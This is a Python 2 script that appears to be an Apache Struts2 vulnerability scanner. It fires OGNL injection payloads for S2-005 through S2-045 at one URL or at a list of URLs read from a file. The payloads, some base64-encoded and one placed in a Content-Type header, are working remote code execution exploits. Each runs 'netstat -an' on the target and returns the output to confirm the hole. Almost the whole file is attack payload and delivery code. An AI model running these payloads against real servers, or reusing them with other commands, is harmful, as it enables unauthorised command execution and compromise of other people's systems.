#!/usr/bin/env python
# coding=utf-8
# code by Lucifer

import sys
import base64
import warnings
import requests
from termcolor import cprint

warnings.filterwarnings("ignore")
reload(sys)
sys.setdefaultencoding('utf-8')

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
}
headers2 = {
     "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
     "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
     "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
}
class struts_baseverify:
    def __init__(self, url):
        self.url = url
        self.poc = {
                "ST2-005":base64.b64decode("KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCduZXRzdGF0IC1hblwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp"),
                "ST2-009":'''class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]''',
                "ST2-013":base64.b64decode("YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCduZXRzdGF0IC1hbicpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0="),
                "ST2-016":base64.b64decode("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3RyZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMjNyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZGlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJhY3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXRlcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ=="),
                "ST2-019":base64.b64decode("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeyduZXRzdGF0JywnLWFuJ30pKS5zdGFydCgpLCNiPSNhLmdldElucHV0U3RyZWFtKCksI2M9bmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoI2IpLCNkPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCNjKSwjZT1uZXcgY2hhclsxMDAwMF0sI2QucmVhZCgjZSksI3Jlc3AucHJpbnRsbigjZSksI3Jlc3AuY2xvc2UoKQ=="),
                "ST2-devmode":'''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=netstat%20-an''',
                "ST2-032":'''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat -an&pp=____A&ppp=%20&encoding=UTF-8''', 
                "ST2-037":'''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=netstat -an''',
                "ST2-045":"",
                }
    def check(self, pocname, vulnstr):
        if vulnstr.find("Active Internet connections") is not -1:
            cprint("目标存在" + pocname + "漏洞..[Linux]", "red")
        elif vulnstr.find("Active Connections") is not -1:
            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
        elif vulnstr.find("活动连接") is not -1:
            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
        elif vulnstr.find("LISTEN") is not -1:
            cprint("目标存在" + pocname + "漏洞..[未知OS]", "red")
        else:
            cprint("目标不存在" + pocname +"漏洞..", "green")

    def scan(self):
        cprint("-------检测struts2漏洞--------\n目标url:"+self.url, "cyan")
        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-005'], timeout=6, verify=False)
            self.check("struts2-005", req.text)
        except:
            cprint("检测struts2-005超时..", "cyan")
        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-009'], timeout=6, verify=False)
            self.check("struts2-009", req.text)
        except:
            cprint("检测struts2-009超时..", "cyan")
        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-013'], timeout=6, verify=False)
            self.check("struts2-013", req.text)
        except:
            cprint("检测struts2-013超时..", "cyan")
        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-016'], timeout=6, verify=False)
            self.check("struts2-016", req.text)
        except:
            cprint("检测struts2-016超时..", "cyan")
        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-019'], timeout=6, verify=False)
            self.check("struts2-019", req.text)
        except:
            cprint("检测struts2-019超时..", "cyan")
        try:
            req = requests.get(self.url+self.poc['ST2-devmode'], headers=headers, timeout=6, verify=False)
            self.check("struts2-devmode", req.text)
        except:
            cprint("检测struts2-devmode超时..", "cyan")
        try:
            req = requests.get(self.url+self.poc['ST2-032'], headers=headers, timeout=6, verify=False)
            self.check("struts2-032", req.text)
        except:
            cprint("检测struts2-032超时..", "cyan")
        try:
            req = requests.get(self.url+self.poc['ST2-037'], headers=headers, timeout=6, verify=False)
            self.check("struts2-037", req.text)
        except:
            cprint("检测struts2-037超时..", "cyan")

        try:
            req = requests.get(self.url, headers=headers2, timeout=6, verify=False)
            self.check("struts2-045", req.text)
        except:
            cprint("检测struts2-045超时..", "cyan")


if __name__ == "__main__":
    try:
        if sys.argv[1] == "-f":
            with open(sys.argv[2]) as f:
                for line in f.readlines():
                    line = line.strip()
                    strutsVuln = struts_baseverify(line)
                    strutsVuln.scan()
        else:
            strutsVuln = struts_baseverify(sys.argv[1])
            strutsVuln.scan()
    except:
        print "Usage: python struts-scan.py http://example.com/index.action"
        print "       python struts-scan.py -f url.txt"

